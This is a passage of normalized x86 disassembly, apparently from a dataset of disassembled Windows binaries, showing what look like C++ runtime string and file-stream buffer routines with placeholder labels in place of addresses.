mov [ ebp - 0x34 ] esi
mov [ ebp - 0x30 ] 0x0
push 0xffffffff
mov [ ebp - 0x4 ] 0x2
lea ecx [ ebp + 0xc ]
push [ ebp + 0x34 ]
push esi
call sub_409d20
mov eax [ esi + 0x10 ]
mov ecx esi
add eax 0xfffffffd
mov [ ebp - 0x30 ] 0x1
push eax
push 0x1
lea eax [ ebp - 0x2c ]
push eax
call sub_409d20
mov edi eax
cmp esi edi
je r-xdata
mov [ ebp - 0x4 ] 0x2
mov eax [ ebp - 0x18 ]
cmp eax 0x10
jb r-xdata
cmp [ esi + 0x14 ] 0x10
jb r-xdata
cmp [ esi + 0x14 ] 0x10
jb r-xdata
inc eax
lea ecx [ ebp - 0x2c ]
push eax
push [ ebp - 0x2c ]
call sub_406f10
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov eax [ esi + 0x14 ]
mov ecx esi
inc eax
push eax
push [ esi ]
call sub_406f10
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov eax [ ebp + 0x20 ]
cmp eax 0x10
jb r-xdata
mov eax [ esi + 0x10 ]
mov ecx esi
add eax 0xfffffffe
push eax
push 0x1
lea eax [ ebp - 0x2c ]
push eax
call sub_409d20
mov edi eax
cmp esi edi
je r-xdata
cmp [ eax ] 0x22
jne r-xdata
push edi
mov ecx esi
mov [ eax ] 0x0
call sub_40b670
mov ecx [ ebp + 0x38 ]
mov [ ebp + 0x20 ] 0xf
mov [ ebp + 0x1c ] 0x0
mov [ ebp + 0xc ] 0x0
cmp ecx 0x10
jb r-xdata
inc eax
lea ecx [ ebp + 0xc ]
push eax
push [ ebp + 0xc ]
call sub_406f10
mov eax [ ebp - 0x18 ]
cmp eax 0x10
jb r-xdata
mov eax [ esi + 0x14 ]
cmp eax 0x10
jb r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_40d56a
mov esp ebp
pop ebp
retn 0x34
inc ecx
push ecx
push [ ebp + 0x24 ]
lea ecx [ ebp + 0x24 ]
call sub_406f10
inc eax
lea ecx [ ebp - 0x2c ]
push eax
push [ ebp - 0x2c ]
call sub_406f10
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
cmp [ esi + 0x14 ] 0x10
jb r-xdata
inc eax
mov ecx esi
push eax
push [ esi ]
call sub_406f10
mov eax esi
mov eax [ esi ]
jmp r-xdata
push edi
mov ecx esi
mov [ eax ] 0x0
call sub_40b670
sub_409a00
push ebp
mov ebp esp
push 0xffffffff
push sub_42a91b
mov eax [ fs : 0x0 ]
push eax
sub esp 0x140
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
push 0x6
push r--data
push edi
mov [ ebp - 0x148 ] 0x0
call sub_416100
add esp 0xc
test eax eax
je r-xdata
push 0x0
mov [ esi + 0x14 ] 0xf
mov ecx esi
mov [ esi + 0x10 ] 0x0
push r--data
mov [ esi ] 0x0
call sub_406a90
push 0xff
lea eax [ ebp - 0x10f ]
push 0x0
push eax
call sub_411230
mov eax [ r--data ]
mov [ ebp - 0x110 ] eax
mov ax [ r--data ]
push 0x6
mov [ ebp - 0x10c ] ax
mov al [ r--data ]
push r--data
push edi
mov [ ebp - 0x10a ] al
call sub_416100
add esp 0x18
test eax eax
jne r-xdata
mov [ ebp - 0x12c ] 0xf
mov [ ebp - 0x130 ] eax
mov [ ebp - 0x140 ] al
cmp [ edi ] al
jne r-xdata
mov ecx edi
lea edx [ ecx + 0x1 ]
xor ecx ecx
jmp r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
push ecx
push edi
lea ecx [ ebp - 0x140 ]
call sub_406a90
push 0x1
push 0x0
lea eax [ ebp - 0x144 ]
mov [ ebp - 0x4 ] 0x0
push eax
lea ecx [ ebp - 0x140 ]
mov [ ebp - 0x144 ] 0x3b
call sub_40b270
mov ecx eax
cmp ecx 0xffffffff
jne r-xdata
lea eax [ ecx - 0x6 ]
push eax
lea eax [ edi + 0x6 ]
push eax
lea eax [ ebp - 0x109 ]
push eax
call sub_4117a0
add esp 0xc
mov [ ebp - 0x114 ] 0xf
cmp [ ebp - 0x110 ] 0x0
mov [ ebp - 0x118 ] 0x0
mov [ ebp - 0x128 ] 0x0
jne r-xdata
mov ecx edi
lea edx [ ecx + 0x1 ]
nop [ eax ] eax
lea ecx [ ebp - 0x110 ]
lea edx [ ecx + 0x1 ]
xor ecx ecx
jmp r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
push ecx
lea eax [ ebp - 0x110 ]
push eax
lea ecx [ ebp - 0x128 ]
call sub_406a90
lea eax [ ebp - 0x128 ]
mov ecx esi
push eax
call sub_409de0
mov eax [ ebp - 0x114 ]
cmp eax 0x10
jb r-xdata
mov eax [ ebp - 0x12c ]
mov [ ebp - 0x114 ] 0xf
mov [ ebp - 0x118 ] 0x0
mov [ ebp - 0x128 ] 0x0
cmp eax 0x10
jb r-xdata
inc eax
lea ecx [ ebp - 0x128 ]
push eax
push [ ebp - 0x128 ]
call sub_406f10
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_40d56a
mov esp ebp
pop ebp
retn 0x8
inc eax
lea ecx [ ebp - 0x140 ]
push eax
push [ ebp - 0x140 ]
call sub_406f10
jmp r-xdata
sub_409c50
push esi
mov esi ecx
mov eax [ esi + 0x14 ]
cmp eax 0x8
jb r-xdata
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
cmp [ esi + 0x14 ] 0x8
jb r-xdata
inc eax
push eax
push [ esi ]
call sub_40bc80
xor eax eax
mov [ esi ] ax
pop esi
retn
mov eax [ esi ]
xor ecx ecx
pop esi
mov [ eax ] cx
retn
sub_409c90
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
xor eax eax
push esi
mov esi ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] ax
cmp [ edx ] ax
jne r-xdata
mov ecx edx
push edi
lea edi [ ecx + 0x2 ]
nop [ eax ] eax
xor ecx ecx
push ecx
push edx
mov ecx esi
call sub_40af50
mov eax esi
pop esi
pop ebp
retn 0x4
mov ax [ ecx ]
add ecx 0x2
test ax ax
jne r-xdata
sub ecx edi
sar ecx 0x1
pop edi
push ecx
push edx
mov ecx esi
call sub_40af50
mov eax esi
pop esi
pop ebp
retn 0x4
sub_409cf0
push ebp
mov ebp esp
push esi
mov esi ecx
xor eax eax
push 0xffffffff
push eax
push [ ebp + 0x8 ]
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] ax
call sub_40b050
mov eax esi
pop esi
pop ebp
retn 0x4
sub_409d20
push ebp
mov ebp esp
push ecx
push esi
push [ ebp + 0x10 ]
mov esi [ ebp + 0x8 ]
push [ ebp + 0xc ]
mov [ ebp - 0x4 ] 0x0
push ecx
mov [ esi + 0x14 ] 0xf
mov ecx esi
mov [ esi + 0x10 ] 0x0
mov [ esi ] 0x0
call sub_406b90
mov eax esi
pop esi
mov esp ebp
pop ebp
retn 0xc
sub_409d60
push ebp
mov ebp esp
push 0xffffffff
push sub_42a560
mov eax [ fs : 0x0 ]
push eax
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
cmp esi [ ebp + 0x8 ]
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
mov eax [ esi + 0x14 ]
cmp eax 0x10
jb r-xdata
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
cmp [ esi + 0x14 ] 0x10
jb r-xdata
inc eax
push eax
push [ esi ]
call sub_406f10
mov eax esi
mov eax [ esi ]
jmp r-xdata
push [ ebp + 0x8 ]
mov ecx esi
mov [ eax ] 0x0
call sub_40b670
sub_409de0
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi ecx
mov [ edi + 0x14 ] 0xf
mov [ edi + 0x10 ] 0x0
mov [ edi ] 0x0
cmp [ esi + 0x14 ] 0x10
jae r-xdata
mov eax [ esi ]
mov [ edi ] eax
mov [ esi ] 0x0
mov eax [ esi + 0x10 ]
add eax 0x1
je r-xdata
mov eax edi
mov [ esi ] 0x0
pop edi
pop esi
pop ebp
retn 0x4
mov eax [ esi ]
mov [ eax ] 0x0
mov eax edi
pop edi
pop esi
pop ebp
retn 0x4
mov eax [ esi + 0x10 ]
mov [ edi + 0x10 ] eax
mov eax [ esi + 0x14 ]
mov [ edi + 0x14 ] eax
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
cmp [ esi + 0x14 ] 0x10
jb r-xdata
push eax
push esi
push edi
call sub_410380
add esp 0xc
jmp r-xdata
sub_409e60
push ebp
mov ebp esp
push 0xffffffff
push sub_42a982
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov [ ebp - 0x14 ] edi
cmp [ ebp + 0x14 ] 0x0
mov [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ edi ]
lea esi [ edi + 0x10 ]
mov eax [ eax + 0x4 ]
mov [ edi + eax ] r--data
mov eax [ edi ]
mov ecx [ eax + 0x4 ]
push ecx
push esi
lea eax [ ecx - 0x18 ]
mov [ ecx + edi - 0x4 ] eax
mov eax [ edi ]
mov [ edi + 0x8 ] 0x0
mov [ edi + 0xc ] 0x0
mov ecx [ eax + 0x4 ]
add ecx edi
call sub_40c0a0
mov [ ebp - 0x4 ] 0x2
mov eax [ edi ]
mov [ ebp + 0x14 ] esi
mov eax [ eax + 0x4 ]
mov [ edi + eax ] r--data
mov eax [ edi ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x70 ]
mov [ ecx + edi - 0x4 ] eax
mov ecx esi
call sub_40bfe0
push 0x0
push 0x0
mov ecx esi
mov [ esi ] r--data
call sub_40b9b0
push [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
mov ecx esi
or eax 0x1
mov [ ebp - 0x4 ] 0x3
push eax
push [ ebp + 0x8 ]
call sub_40bb50
test eax eax
jne r-xdata
mov [ edi ] r--data
mov [ edi + 0x70 ] r--data
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x10 ] 0x1
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x10
mov eax [ edi ]
mov ecx [ eax + 0x4 ]
mov eax [ ecx + edi + 0xc ]
add ecx edi
or eax 0x2
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
push 0x0
push eax
call sub_4082b0
or eax 0x4
sub_409f80
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_40ca70
add esp 0x4
mov ecx esi
push eax
call sub_40b750
pop esi
pop ebp
retn 0x4
sub_409fa0
push esi
mov esi ecx
cmp [ esi + 0x4c ] 0x0
je r-xdata
xor eax eax
pop esi
retn
mov eax [ esi ]
push 0xffffffff
call [ eax + 0xc ]
cmp eax 0xffffffff
je r-xdata
push [ esi + 0x4c ]
call sub_416306
add esp 0x4
test eax eax
jns r-xdata
or eax 0xffffffff
pop esi
retn
sub_409fd0
push ebp
mov ebp esp
push esi
mov esi ecx
mov ecx [ esi + 0x4c ]
test ecx ecx
je r-xdata
xor eax eax
pop esi
pop ebp
retn 0xc
mov edx [ ebp + 0x8 ]
test edx edx
jne r-xdata
xor eax eax
mov eax [ ebp + 0xc ]
or eax [ ebp + 0x10 ]
jne r-xdata
push 0x1
push [ esi + 0x4c ]
mov ecx esi
call sub_40b9b0
mov eax esi
pop esi
pop ebp
retn 0xc
lea eax [ edx + 0x4 ]
jmp r-xdata
push [ ebp + 0xc ]
push eax
push edx
push ecx
call sub_4164a5
add esp 0x10
test eax eax
jne r-xdata
sub_40a020
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0xc
mov eax [ ebp + 0x14 ]
push ebx
mov ebx [ ebp + 0x10 ]
push esi
mov esi ecx
mov [ esp + 0xc ] eax
mov eax [ ebp + 0x18 ]
push edi
mov edi [ ebp + 0xc ]
cmp [ esi + 0x4c ] 0x0
mov [ esp + 0x14 ] eax
je r-xdata
mov edx [ ebp + 0x8 ]
xorps xmm0 xmm0
mov eax [ r--data ]
mov ecx [ r--data ]
pop edi
mov [ edx ] eax
mov eax edx
pop esi
mov [ edx + 0x4 ] ecx
mov [ edx + 0x8 ] 0x0
mov [ edx + 0xc ] 0x0
movq [ edx + 0x10 ] xmm0
pop ebx
mov esp ebp
pop ebp
retn 0x20
call sub_40b7e0
test al al
je r-xdata
lea eax [ esp + 0x10 ]
push eax
push [ esi + 0x4c ]
call sub_41651b
add esp 0x8
test eax eax
jne r-xdata
mov eax edi
or eax ebx
je r-xdata
lea eax [ esp + 0x10 ]
push eax
push [ esi + 0x4c ]
call sub_416846
add esp 0x8
test eax eax
jne r-xdata
push 0x1
push ebx
push edi
push [ esi + 0x4c ]
call sub_416810
add esp 0x10
test eax eax
jne r-xdata
mov eax [ ebp + 0x1c ]
mov ecx esi
mov [ esi + 0x40 ] eax
mov eax [ ebp + 0x20 ]
mov [ esi + 0x44 ] eax
call sub_40b720
mov eax [ ebp + 0x8 ]
mov edx [ esi + 0x40 ]
mov esi [ esi + 0x44 ]
mov ecx [ esp + 0x10 ]
mov [ eax + 0x8 ] ecx
mov ecx [ esp + 0x14 ]
mov [ eax ] 0x0
mov [ eax + 0x4 ] 0x0
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] edx
mov [ eax + 0x14 ] esi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x20
sub_40a120
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0xc
push ebx
push esi
mov esi ecx
push edi
mov eax [ esi + 0x1c ]
lea ecx [ esi + 0x3c ]
cmp [ eax ] ecx
jne r-xdata
mov ebx [ ebp + 0x10 ]
mov edi [ ebp + 0xc ]
cmp [ ebp + 0x14 ] 0x1
jne r-xdata
mov edx [ ebp + 0x8 ]
xorps xmm0 xmm0
mov eax [ r--data ]
mov ecx [ r--data ]
pop edi
mov [ edx ] eax
mov eax edx
pop esi
mov [ edx + 0x4 ] ecx
mov [ edx + 0x8 ] 0x0
mov [ edx + 0xc ] 0x0
movq [ edx + 0x10 ] xmm0
pop ebx
mov esp ebp
pop ebp
retn 0x14
mov ecx esi
call sub_40b7e0
test al al
je r-xdata
cmp [ esi + 0x38 ] 0x0
jne r-xdata
mov eax edi
or eax ebx
mov eax [ ebp + 0x14 ]
jne r-xdata
mov edi [ ebp + 0xc ]
mov ebx [ ebp + 0x10 ]
add edi 0xffffffff
adc ebx 0xffffffff
jmp r-xdata
push eax
push ebx
push edi
push [ esi + 0x4c ]
call sub_416810
add esp 0x10
test eax eax
jne r-xdata
cmp eax 0x1
je r-xdata
cmp [ esi + 0x4c ] 0x0
je r-xdata
lea eax [ esp + 0x10 ]
push eax
push [ esi + 0x4c ]
call sub_416846
add esp 0x8
test eax eax
jne r-xdata
mov eax [ esi + 0xc ]
lea ecx [ esi + 0x3c ]
cmp [ eax ] ecx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ esi + 0x40 ]
mov esi [ esi + 0x44 ]
mov ecx [ esp + 0x10 ]
mov [ eax + 0x8 ] ecx
mov ecx [ esp + 0x14 ]
mov [ eax ] 0x0
mov [ eax + 0x4 ] 0x0
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] edx
mov [ eax + 0x14 ] esi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x14
mov edx [ esi + 0x54 ]
mov ecx [ esi + 0x50 ]
sub edx ecx
mov [ eax ] ecx
mov eax [ esi + 0x1c ]
mov [ eax ] ecx
mov eax [ esi + 0x2c ]
mov [ eax ] edx
sub_40a230
push ebp
mov ebp esp
push 0xffffffff
push sub_42a9a8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x30
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov [ ebp - 0x34 ] edi
mov eax [ edi + 0x1c ]
mov ecx [ eax ]
test ecx ecx
je r-xdata
cmp [ edi + 0x4c ] 0x0
jne r-xdata
mov edx [ edi + 0x2c ]
mov esi [ edx ]
lea eax [ esi + ecx ]
cmp ecx eax
jae r-xdata
mov esi [ edi + 0xc ]
lea eax [ edi + 0x3c ]
cmp [ esi ] eax
jne r-xdata
or eax 0xffffffff
jmp r-xdata
lea eax [ esi - 0x1 ]
mov [ edx ] eax
mov ecx [ edi + 0x1c ]
mov edx [ ecx ]
lea eax [ edx + 0x1 ]
mov [ ecx ] eax
movzx eax [ edx ]
jmp r-xdata
cmp [ edi + 0x38 ] 0x0
jne r-xdata
mov edx [ edi + 0x54 ]
mov ecx [ edi + 0x50 ]
sub edx ecx
mov [ esi ] ecx
mov eax [ edi + 0x1c ]
mov [ eax ] ecx
mov eax [ edi + 0x2c ]
mov [ eax ] edx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_40d56a
mov esp ebp
pop ebp
retn
mov [ ebp - 0x14 ] 0xf
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x28 ] 0x0
mov [ ebp - 0x4 ] 0x0
push [ edi + 0x4c ]
call sub_4152ed
mov edx eax
add esp 0x4
mov [ ebp - 0x38 ] edx
cmp edx 0xffffffff
je r-xdata
push [ edi + 0x4c ]
call sub_4152ed
add esp 0x4
cmp eax 0xffffffff
je r-xdata
or esi 0xffffffff
mov ebx [ ebp - 0x18 ]
or ecx 0xffffffff
sub ecx ebx
cmp ecx 0x1
jbe r-xdata
movzx eax al
jmp r-xdata
mov eax esi
inc ecx
push ecx
push [ ebp - 0x28 ]
lea ecx [ ebp - 0x28 ]
call sub_406f10
push r--data
call sub_40e50b
lea esi [ ebx + 0x1 ]
cmp esi 0xfffffffe
ja r-xdata
mov ecx [ ebp - 0x14 ]
cmp ecx esi
jae r-xdata
test esi esi
jne r-xdata
push ebx
push esi
lea ecx [ ebp - 0x28 ]
call sub_4070d0
mov ecx [ ebp - 0x14 ]
mov ebx [ ebp - 0x18 ]
mov edx [ ebp - 0x38 ]
test esi esi
je r-xdata
cmp ecx 0x10
lea eax [ ebp - 0x28 ]
cmovae eax [ ebp - 0x28 ]
mov [ eax + ebx ] dl
lea eax [ ebp - 0x28 ]
cmp [ ebp - 0x14 ] 0x10
mov [ ebp - 0x18 ] esi
cmovae eax [ ebp - 0x28 ]
mov [ eax + esi ] 0x0
cmp ecx 0x10
mov [ ebp - 0x18 ] esi
lea eax [ ebp - 0x28 ]
cmovae eax [ ebp - 0x28 ]
mov [ eax ] 0x0
jmp r-xdata
lea eax [ ebp - 0x3c ]
cmp ecx 0x10
mov ecx [ ebp - 0x34 ]
lea edi [ ebp - 0x28 ]
cmovae edi [ ebp - 0x28 ]
lea esi [ ebp - 0x28 ]
cmovae esi [ ebp - 0x28 ]
push eax
mov ecx [ ecx + 0x38 ]
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x29 ]
push eax
mov edx [ ecx ]
lea eax [ ebp - 0x30 ]
push eax
lea eax [ ebx + edi ]
mov edi [ ebp - 0x34 ]
push eax
push esi
lea eax [ edi + 0x40 ]
push eax
call [ edx + 0x18 ]
test eax eax
js r-xdata
cmp eax 0x1
jle r-xdata
mov ebx [ ebp - 0x18 ]
mov ecx [ ebp - 0x14 ]
lea eax [ ebp - 0x29 ]
cmp [ ebp - 0x3c ] eax
jne r-xdata
cmp eax 0x3
jne r-xdata
cmp [ ebp - 0x14 ] 0x10
lea eax [ ebp - 0x28 ]
mov esi [ ebp - 0x18 ]
cmovae eax [ ebp - 0x28 ]
mov ecx [ ebp - 0x30 ]
sub esi ecx
add esi eax
test esi esi
jle r-xdata
cmp [ ebp - 0x14 ] 0x10
lea ecx [ ebp - 0x28 ]
mov eax [ ebp - 0x30 ]
cmovae ecx [ ebp - 0x28 ]
sub eax ecx
lea ecx [ ebp - 0x28 ]
push eax
push 0x0
call sub_407030
cmp [ ebp - 0x18 ] 0x1
jb r-xdata
movzx esi [ ebp - 0x29 ]
jmp r-xdata
push [ edi + 0x4c ]
movsx eax [ esi + ecx - 0x1 ]
dec esi
push eax
call sub_41560b
add esp 0x8
test esi esi
jle r-xdata
push [ edi + 0x4c ]
call sub_4152ed
mov edx eax
add esp 0x4
mov [ ebp - 0x38 ] edx
cmp edx 0xffffffff
jne r-xdata
cmp [ ebp - 0x14 ] 0x10
jb r-xdata
mov ecx [ ebp - 0x14 ]
cmp ecx 0x10
jb r-xdata
mov ecx [ ebp - 0x30 ]
jmp r-xdata
lea eax [ ebp - 0x28 ]
mov eax [ ebp - 0x28 ]
test eax eax
jne r-xdata
mov al [ eax ]
mov [ ebp - 0x29 ] al
movzx esi al
jmp r-xdata
mov [ ebp - 0x29 ] al
call sub_41529e
mov [ eax ] 0x16
call sub_413b01
mov al [ ebp - 0x29 ]
movzx esi al
jmp r-xdata
sub_40a4e0
push esi
mov esi ecx
mov eax [ esi + 0x1c ]
mov ecx [ eax ]
test ecx ecx
je r-xdata
mov eax [ esi ]
mov ecx esi
push edi
call [ eax + 0x1c ]
mov edi eax
cmp edi 0xffffffff
jne r-xdata
mov eax [ esi + 0x2c ]
mov eax [ eax ]
add eax ecx
cmp ecx eax
jae r-xdata
mov eax [ esi ]
mov ecx esi
push edi
call [ eax + 0x10 ]
mov eax edi
pop edi
pop esi
retn
pop edi
or eax eax
pop esi
retn
movzx eax [ ecx ]
pop esi
retn
sub_40a520
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi ecx
mov eax [ esi + 0x1c ]
mov ecx [ eax ]
test ecx ecx
je r-xdata
mov eax [ esi + 0x4c ]
test eax eax
je r-xdata
mov eax [ esi + 0xc ]
cmp [ eax ] ecx
jae r-xdata
pop esi
or eax 0xffffffff
pop ebx
pop ebp
retn 0x4
cmp ebx 0xffffffff
je r-xdata
cmp ebx 0xffffffff
je r-xdata
cmp [ esi + 0x38 ] 0x0
jne r-xdata
mov eax [ esi + 0x2c ]
inc [ eax ]
mov eax [ esi + 0x1c ]
pop esi
dec [ eax ]
xor eax eax
cmp ebx 0xffffffff
cmovne eax ebx
pop ebx
pop ebp
retn 0x4
movzx eax [ ecx - 0x1 ]
cmp eax ebx
jne r-xdata
mov eax [ esi + 0x1c ]
lea ecx [ esi + 0x3c ]
cmp [ eax ] ecx
je r-xdata
push eax
movzx ecx bl
push ecx
call sub_41560b
add esp 0x8
cmp eax 0xffffffff
jne r-xdata
mov [ ecx ] bl
mov ecx esi
call sub_40b6e0
pop esi
mov eax ebx
pop ebx
pop ebp
retn 0x4
sub_40a5b0
push ebp
mov ebp esp
push 0xffffffff
push sub_42a9d8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx ecx
mov ecx [ ebp + 0x8 ]
cmp ecx 0xffffffff
sete al
test al al
je r-xdata
mov eax [ ebx + 0x20 ]
mov edx [ eax ]
test edx edx
je r-xdata
xor eax eax
cmp ecx 0xffffffff
cmovne eax ecx
jmp r-xdata
cmp [ ebx + 0x4c ] 0x0
jne r-xdata
mov esi [ ebx + 0x30 ]
mov edi [ esi ]
lea eax [ edi + edx ]
cmp edx eax
jae r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_40d56a
mov esp ebp
pop ebp
retn 0x4
mov esi [ ebx + 0xc ]
lea eax [ ebx + 0x3c ]
cmp [ esi ] eax
jne r-xdata
or eax 0xffffffff
jmp r-xdata
lea eax [ edi - 0x1 ]
mov [ esi ] eax
mov ecx [ ebx + 0x20 ]
mov edx [ ecx ]
lea eax [ edx + 0x1 ]
mov [ ecx ] eax
mov eax [ ebp + 0x8 ]
mov [ edx ] al
jmp r-xdata
cmp [ ebx + 0x38 ] 0x0
jne r-xdata
mov ecx [ ebx + 0x50 ]
mov edx [ ebx + 0x54 ]
mov [ esi ] ecx
sub edx ecx
mov eax [ ebx + 0x1c ]
mov [ eax ] ecx
mov eax [ ebx + 0x2c ]
mov ecx [ ebp + 0x8 ]
mov [ eax ] edx
push 0x0
mov [ ebp - 0x29 ] cl
lea ecx [ ebp - 0x28 ]
push 0x8
mov [ ebp - 0x14 ] 0xf
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x28 ] 0x0
call sub_40b370
mov [ ebp - 0x4 ] 0x0
push [ ebx + 0x4c ]
movsx eax cl
push eax
call sub_415418
or ecx 0xffffffff
add esp 0x8
cmp eax ecx
cmovne ecx [ ebp + 0x8 ]
mov eax ecx
jmp r-xdata
mov ecx [ ebp - 0x14 ]
cmp eax 0x1
jg r-xdata
mov eax ebx
inc ecx
push ecx
push [ ebp - 0x28 ]
lea ecx [ ebp - 0x28 ]
call sub_406f10
cmp eax 0x3
jne r-xdata
mov ecx [ ebp - 0x14 ]
lea eax [ ebp - 0x28 ]
mov edx [ ebp - 0x28 ]
cmp ecx 0x10
mov esi [ ebp - 0x30 ]
cmovae eax edx
sub esi eax
je r-xdata
push [ ebx + 0x4c ]
movsx eax [ ebp - 0x29 ]
push eax
call sub_415418
mov ecx [ ebp - 0x14 ]
add esp 0x8
cmp eax 0xffffffff
mov ebx 0xffffffff
cmovne ebx [ ebp + 0x8 ]
jmp r-xdata
lea eax [ ebp - 0x29 ]
mov [ ebx + 0x3d ] 0x1
cmp [ ebp - 0x34 ] eax
jne r-xdata
push [ ebx + 0x4c ]
cmp ecx 0x10
lea eax [ ebp - 0x28 ]
push esi
cmovae eax edx
push 0x1
push eax
call sub_416ad9
mov ecx [ ebp - 0x14 ]
add esp 0x10
cmp esi eax
jne r-xdata
cmp ecx 0x10
jb r-xdata
mov ebx [ ebp + 0x8 ]
jmp r-xdata
mov edi [ ebp - 0x18 ]
test esi esi
jne r-xdata
or ebx 0xffffffff
cmp ecx 0x10
lea eax [ ebp - 0x28 ]
mov ecx [ ebx + 0x38 ]
lea edx [ ebp - 0x28 ]
cmovae eax [ ebp - 0x28 ]
cmovae edx [ ebp - 0x28 ]
add eax edi
mov esi [ ecx ]
lea ecx [ ebp - 0x30 ]
push ecx
mov ecx [ ebx + 0x38 ]
push eax
push edx
lea eax [ ebp - 0x34 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x29 ]
push eax
lea eax [ ebx + 0x40 ]
push eax
call [ esi + 0x1c ]
test eax eax
js r-xdata
cmp edi 0x20
jae r-xdata
or eax 0xffffffff
sub eax edi
cmp eax 0x8
jbe r-xdata
push r--data
call sub_40e50b
lea esi [ edi + 0x8 ]
cmp esi 0xfffffffe
ja r-xdata
cmp ecx esi
jae r-xdata
test esi esi
jne r-xdata
push edi
push esi
lea ecx [ ebp - 0x28 ]
call sub_4070d0
mov ecx [ ebp - 0x14 ]
mov edi [ ebp - 0x18 ]
test esi esi
je r-xdata
cmp ecx 0x10
lea eax [ ebp - 0x28 ]
xorps xmm0 xmm0
cmovae eax [ ebp - 0x28 ]
movq [ edi + eax ] xmm0
lea eax [ ebp - 0x28 ]
cmp [ ebp - 0x14 ] 0x10
mov [ ebp - 0x18 ] esi
cmovae eax [ ebp - 0x28 ]
mov [ esi + eax ] 0x0
jmp r-xdata
cmp ecx 0x10
mov [ ebp - 0x18 ] esi
lea eax [ ebp - 0x28 ]
cmovae eax [ ebp - 0x28 ]
mov [ eax ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x14 ]
mov edi [ ebp - 0x18 ]
sub_40a850
push ebp
mov ebp esp
push 0xffffffff
push sub_42a886
mov eax [ fs : 0x0 ]
push eax
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
cmp [ esi + 0x4c ] 0x0
mov [ esi ] r--data
je r-xdata
cmp [ esi + 0x48 ] 0x0
je r-xdata
mov edi [ esi + 0xc ]
lea eax [ esi + 0x3c ]
cmp [ edi ] eax
jne r-xdata
mov [ esi ] r--data
mov esi [ esi + 0x34 ]
test esi esi
je r-xdata
mov ecx esi
call sub_40ba90
mov edx [ esi + 0x54 ]
mov ecx [ esi + 0x50 ]
sub edx ecx
mov [ edi ] ecx
mov eax [ esi + 0x1c ]
mov [ eax ] ecx
mov eax [ esi + 0x2c ]
mov [ eax ] edx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
